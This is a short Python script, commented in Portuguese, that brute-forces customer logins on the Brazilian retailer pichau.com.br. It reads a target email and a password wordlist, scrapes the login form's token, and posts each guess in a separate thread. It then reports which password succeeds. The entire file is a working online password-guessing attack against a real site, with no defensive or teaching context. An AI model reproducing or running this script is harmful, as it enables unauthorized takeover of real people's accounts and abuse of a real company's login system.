import re, requests
import sys
import os
from colorama import init
from termcolor import colored
from threading import Thread
from time import sleep
init()

def testanu(email, senha):
    web = requests.Session() #iniciando uma sessao com o requests
    token = web.get("https://www.pichau.com.br/customer/account/login/") #faznedo o get para pegar o token
    token = re.search('name="form_key" value="(.+?)"', token.text).group(1) #pegando o token pelo input do tipo hydden com regex
    logar = web.post("https://www.pichau.com.br/customer/account/loginPost/",
                     data={"form_key": token, "login[username]": email, "login[password]": senha}) #efetuando o post do login com o token pegado
    if 'class="error-msg"' in logar.text: #verificnado se entrou ou n
        print(colored("[x] Não foi possivel completar o login, senha => {}".format(senha.strip()), 'red')) #printando q n entrou
    else:
        print(colored("[*] Autenticado com sucesso, senha => {}".format(senha.strip()), 'green')) #deu zerto rararar

    exit()

if __name__ == '__main__': #nao sei pra q serve mais eu uso
    os.system("cls") #apagar o cmd
    email = input(colored("[!] Insira o e-mail para os testes: ", 'yellow')) #definindo o email alvo
    arq = input(colored("[!] Arquivo com as senhas: ", 'yellow')) #perguntando o nome do arquivo
    try: #try para verificar se o arquivo existe ou não
        arq = open(arq, "r", encoding="utf-8") #abrindo arquivo com utf-8
    except FileNotFoundError:
        exit(print("[!] Arquivo não encontrado: {}".format(arq))) #saindo do script e printando o erro

    threads = [] #criando uma lista pra inserir os threads e dar join

    for senha in arq.readlines(): #para cada linha uma senha do arquivo
        senha = senha.strip() #limpando impurezas da string
        thread = Thread(target=testanu, args=(email, senha,)) #definindo a variavel thread com a função 'testanu' enviando os argumentos email e senha definidos anteriormente
        thread.daemon = True #definindo o daemon do thread
        thread.start() #iniciando o thread
        threads.append(thread) #inserindo o thread na lista
        sleep(0.1) #dando um tempo para executar os threads para n bugar

    for thread in threads: #para cada thread na lista de threads
        thread.join() #dando join no thread
